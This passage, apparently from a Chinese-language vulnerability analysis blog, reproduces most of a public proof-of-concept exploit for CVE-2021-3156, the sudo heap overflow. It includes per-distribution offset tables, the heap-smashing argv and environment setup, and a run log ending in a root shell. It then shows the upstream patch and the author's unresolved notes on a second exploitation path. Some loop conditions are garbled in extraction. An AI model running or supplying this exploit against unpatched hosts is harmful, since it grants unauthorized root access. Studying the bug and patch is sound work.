    };
    target_t targets[] = {
        {
            // Yes, same values as 20.04.1, but also confirmed.
            .target_name    = "Ubuntu 18.04.5 (Bionic Beaver) - sudo 1.8.21, libc-2.27",
            .sudoedit_path  = "/usr/bin/sudoedit",
            .smash_len_a    = 0x53,
            .smash_len_b    = 0x54,
            .null_stomp_len = 63,
            .lc_all_len     = 0x30
            // .lc_all_len     = 212
        },
        {
            .target_name    = "Ubuntu 20.04.1 (Focal Fossa) - sudo 1.8.31, libc-2.31",
            .sudoedit_path  = "/usr/local/bin/sudoedit",
            .smash_len_a    = 56,
            .smash_len_b    = 54,
            .null_stomp_len = 63,
            .lc_all_len     = 212
        },
        {
            .target_name    = "Debian 10.0 (Buster) - sudo 1.8.27, libc-2.28",
            .sudoedit_path  = "/usr/bin/sudoedit",
            .smash_len_a    = 64,
            .smash_len_b    = 49,
            .null_stomp_len = 60,
            .lc_all_len     = 214
        },
        {
            // Yes, same values as 20.04.1, but also confirmed.
            .target_name    = "openEuler release 20.03 (LTS) - sudo 1.8.27, libc-2.28",
            .sudoedit_path  = "/usr/bin/sudoedit",
            .smash_len_a    = 0x53,
            .smash_len_b    = 0x54,
            .null_stomp_len = 0x185,
            .lc_all_len     = 0xa0
            // .lc_all_len     = 212
        },
    };
    void usage(char *prog) {
        printf("  usage: %s \n\n", prog);
        printf("  available targets:\n");
        printf("  ------------------------------------------------------------\n");
        for(int i = 0; i \n\n");
        if (argc != 2) {
            usage(argv[0]);
            return -1;
        }
        int target_idx = atoi(argv[1]);
        if (target_idx = (sizeof(targets) / sizeof(target_t))) {
            fprintf(stderr, "invalid target index\n");
            return -1;
        }
        target_t *target = &targets[ target_idx ];
        printf("using target: '%s'\n", target->target_name);
        char *smash_a = calloc(target->smash_len_a + 2, 1);
        char *smash_b = calloc(target->smash_len_b + 2, 1);
        memset(smash_a, 'A', target->smash_len_a);
        memset(smash_b, 'B', target->smash_len_b);
        smash_a[target->smash_len_a] = '\\';
        smash_b[target->smash_len_b] = '\\';
        char *s_argv[]={
            // "sudoedit", "-s", smash_a, "\\", NULL
            // "sudoedit", "-s", smash_a, NULL
            "sudoedit", "-s", smash_a, "\\", smash_b, NULL
        };
        char *s_envp[MAX_ENVP];
        int envp_pos = 0;
        for(int i = 0; i null_stomp_len; i++) {
            s_envp[envp_pos++] = "\\";
        }
        s_envp[envp_pos++] = "X/P0P_SH3LLZ_";
        int lc_len = 0x20;
        int lc_num = 0x5;
        int i = 0;
        char *temp=NULL;
        for(i = 11; i > (11 - lc_num); i--){
            temp = calloc(lc_len + strlen(lc_names[i]) + 10, 1);
            strcpy(temp, lc_names[i]);
            strcpy(temp + strlen(lc_names[i]), "=C.UTF-8@");
            memset(temp+strlen(lc_names[i]) + 9, 'A'+i, lc_len);
            s_envp[envp_pos++] = temp;
        }
        temp = calloc(target->lc_all_len + strlen(lc_names[i]) + 10, 1);
        strcpy(temp, lc_names[i]);
        strcpy(temp + strlen(lc_names[i]), "=C.UTF-8@");
        memset(temp+strlen(lc_names[i]) + 9, 'A'+i, target->lc_all_len);
        s_envp[envp_pos++] = temp;
        i -= 1;
        // temp = calloc(0x60 + strlen(lc_names[i]) + 10, 1);
        // strcpy(temp, lc_names[i]);
        // strcpy(temp + strlen(lc_names[i]), "=C.UTF-8@");
        // memset(temp+strlen(lc_names[i]) + 9, 'A'+i, 0x60);
        // s_envp[envp_pos++] = temp;
        //
        // i -= 1;
        temp = calloc(lc_len + strlen(lc_names[i]) + 10, 1);
        strcpy(temp, lc_names[i]);
        strcpy(temp + strlen(lc_names[i]), "=C.UTF-8@");
        memset(temp+strlen(lc_names[i]) + 9, 'A'+i, lc_len);
        s_envp[envp_pos++] = temp;
        i-=1;
        if (target_idx == 3){
            temp = calloc(0xd0 + strlen(lc_names[i]) + 10, 1);
            strcpy(temp, lc_names[i]);
            strcpy(temp + strlen(lc_names[i]), "=C.UTF-8@");
            memset(temp+strlen(lc_names[i]) + 9, 'A'+i, 0xd0);
            s_envp[envp_pos++] = temp;
            i -= 1;
        }
        temp = calloc(lc_len + strlen(lc_names[i]) + 10, 1);
        strcpy(temp, lc_names[i]);
        strcpy(temp + strlen(lc_names[i]), "=XXXXXXXX");
        memset(temp+strlen(lc_names[i]) + 9, 'A'+i, lc_len);
        s_envp[envp_pos++] = temp;
        s_envp[envp_pos++] = NULL;
        printf("** pray for your rootshell.. **\n");
        execve(target->sudoedit_path, s_argv, s_envp);
        // execve(target->sudoedit_path, s_argv, NULL);
        return 0;
    }
    [normal@172 CVE-2021-3156_blasty]$ ./sudo-hax-me-a-sandwich 3
    ** CVE-2021-3156 PoC by blasty 
    using target: 'openEuler release 20.03 (LTS) - sudo 1.8.27, libc-2.28'
    ** pray for your rootshell.. **
    [+] bl1ng bl1ng! We got it!
    sh-5.0# exit
    exit
## Patch
[patch 049ad90590be](https://www.sudo.ws/repos/sudo/rev/049ad90590be)
    --- a/plugins/sudoers/sudoers.c    Sat Jan 23 08:43:59 2021 -0700
    +++ b/plugins/sudoers/sudoers.c    Sat Jan 23 08:43:59 2021 -0700
    @@ -547,7 +547,7 @@
         /* If run as root with SUDO_USER set, set sudo_user.pw to that user. */
         /* XXX - causes confusion when root is not listed in sudoers */
    -    if (sudo_mode & (MODE_RUN | MODE_EDIT) && prev_user != NULL) {
    +    if (ISSET(sudo_mode, MODE_RUN|MODE_EDIT) && prev_user != NULL) {
         if (user_uid == 0 && strcmp(prev_user, "root") != 0) {
             struct passwd *pw;
    @@ -932,8 +932,8 @@
         if (user_cmnd == NULL)
         user_cmnd = NewArgv[0];
    -    if (sudo_mode & (MODE_RUN | MODE_EDIT | MODE_CHECK)) {
    -    if (ISSET(sudo_mode, MODE_RUN | MODE_CHECK)) {
    +    if (ISSET(sudo_mode, MODE_RUN|MODE_EDIT|MODE_CHECK)) {
    +    if (!ISSET(sudo_mode, MODE_EDIT)) {
             const char *runchroot = user_runchroot;
             if (runchroot == NULL && def_runchroot != NULL &&
                 strcmp(def_runchroot, "*") != 0)
    @@ -961,7 +961,8 @@
             sudo_warnx(U_("%s: %s"), __func__, U_("unable to allocate memory"));
             debug_return_int(NOT_FOUND_ERROR);
             }
    -        if (ISSET(sudo_mode, MODE_SHELL|MODE_LOGIN_SHELL)) {
    +        if (ISSET(sudo_mode, MODE_SHELL|MODE_LOGIN_SHELL) &&
    +            ISSET(sudo_mode, MODE_RUN)) {
             /*
              * When running a command via a shell, the sudo front-end
              * escapes potential meta chars.  We unescape non-spaces
    @@ -969,10 +970,22 @@
              */
             for (to = user_args, av = NewArgv + 1; (from = *av); av++) {
                 while (*from) {
    -            if (from[0] == '\\' && !isspace((unsigned char)from[1]))
    +            if (from[0] == '\\' && from[1] != '\0' &&
    +                !isspace((unsigned char)from[1])) {
                     from++;
    +            }
    +            if (size - (to - user_args) < 1) {
    +                sudo_warnx(U_("internal error, %s overflow"),
    +                __func__);
    +                debug_return_int(NOT_FOUND_ERROR);
    +            }
                 *to++ = *from++;
                 }
    +            if (size - (to - user_args) < 1) {
    +            sudo_warnx(U_("internal error, %s overflow"),
    +                __func__);
    +            debug_return_int(NOT_FOUND_ERROR);
    +            }
                 *to++ = ' ';
             }
             *--to = '\0';
`patch`检查了参数是否以反斜杠结尾，并在拷贝过程中对溢出进行了检测。
## 补充
针对利用`1`，我这里没有调试出来，有大佬知道是咋回事嘛，23333
我调试过程中发现没有进入`process_hooks_getenv`的路径，看源码分析，`github`中的`exp`执行的是`SUDO_EDITOR`，从源码中来看应该是位于`find_editor`函数中
    char *
    find_editor(int nfiles, char **files, int *argc_out, char ***argv_out,
         char * const *whitelist, const char **env_editor, bool env_error)
    {
        char *ev[3], *editor_path = NULL;
        unsigned int i;
        debug_decl(find_editor, SUDOERS_DEBUG_UTIL)
        /*
         * If any of SUDO_EDITOR, VISUAL or EDITOR are set, choose the first one.
         */
        *env_editor = NULL;
        ev[0] = "SUDO_EDITOR";
        ev[1] = "VISUAL";
        ev[2] = "EDITOR";
        for (i = 0; i < nitems(ev); i++) {
        char *editor = getenv(ev[i]);
          //...
        }
而该函数在申请完`user_args`堆块之后的调用发现
    /* Require a password if sudoers says so.  */
    switch (check_user(validated, sudo_mode)) {
      case true:
        /* user authenticated successfully. */
        break;
      case false:
        /* Note: log_denial() calls audit for us. */
        if (!ISSET(validated, VALIDATE_SUCCESS)) {
          /* Only display a denial message if no password was read. */
          if (!log_denial(validated, def_passwd_tries <= 0))
            goto done;
        }
        goto bad;
      default:
        /* some other error, ret is -1. */
        goto done;
    }
    //...
    free(safe_cmnd);
    safe_cmnd = find_editor(NewArgc - 1, NewArgv + 1, &edit_argc,
                            &edit_argv, NULL, &env_editor, false);
但是该函数的调用是位于`check_user`函数之后的，该函数经过调试发现需要满足两个条件，一个是密码输入正确，另一个就是用户需要在`sudo`列表中，但是满足这个条件的话就不要提权了。
另外还有调用就是`visudo`和`plugin/sample`了。
原文章中写的环境变量为`SYSTEMD_BYPASS_USERDB`，搜索了一下该环境变量是位于`systemd`中，不知道怎么发生调用。所以现在卡住了。
## 参考
[区域设置](https://zh.wikipedia.org/wiki/%E5%8C%BA%E5%9F%9F%E8%AE%BE%E7%BD%AE)
[Sudo Heap-Based Buffer
Overflow](https://packetstormsecurity.com/files/161160/Sudo-Heap-Based-Buffer-Overflow.html)
[CVE-2021-3156 PoC](https://github.com/blasty/CVE-2021-3156)